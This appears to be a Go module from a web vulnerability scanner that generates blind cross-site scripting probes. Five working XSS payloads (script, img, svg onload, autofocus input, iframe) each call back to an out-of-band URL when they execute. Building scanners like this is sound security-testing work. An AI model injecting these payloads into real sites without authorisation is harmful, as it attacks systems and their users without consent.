package modules

import (
	"context"
	"strings"

	"github.com/akha-security/akca/engine/internal/payloadgen"
)

func (r *Runner) runBlindXSS(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("blind_xss", target); !ok {
		r.emitSkip("blind_xss", target, reason)
		return nil
	}
	if !r.cfg.EnableOAST || r.oast == nil {
		return nil
	}
	oastURL := strings.TrimSpace(r.oastURL(ctx, "blindxss-"+target.Parameter, target, "blind_xss"))
	if oastURL == "" {
		return nil
	}
	for _, p := range blindXSSPayloads(oastURL) {
		if ctx.Err() != nil {
			break
		}
		r.sendOASTProbe(ctx, target, p.Value)
	}
	return nil
}

func blindXSSPayloads(oastURL string) []payloadgen.Payload {
	url := strings.TrimSpace(oastURL)
	if url == "" {
		return nil
	}
	probes := []struct {
		variant, value string
		priority       int
	}{
		{"script_src", `<script src="` + url + `"></script>`, 78},
		{"img_src", `<img src="` + url + `">`, 76},
		{"svg_onload", `<svg/onload="fetch('` + url + `')">`, 74},
		{"input_autofocus", `"><input onfocus=fetch('` + url + `') autofocus>`, 72},
		{"iframe_src", `<iframe src="` + url + `"></iframe>`, 70},
	}
	out := make([]payloadgen.Payload, 0, len(probes))
	for _, pr := range probes {
		out = append(out, payloadgen.Payload{
			Value: pr.value, VulnClass: "blind_xss", Variant: pr.variant, Family: "xss",
			ExpectedSignal: "blind_oast", Priority: pr.priority, BudgetCost: 2,
			VerificationStrategy: "oast_callback", NoiseLevel: "medium",
		})
	}
	return out
}
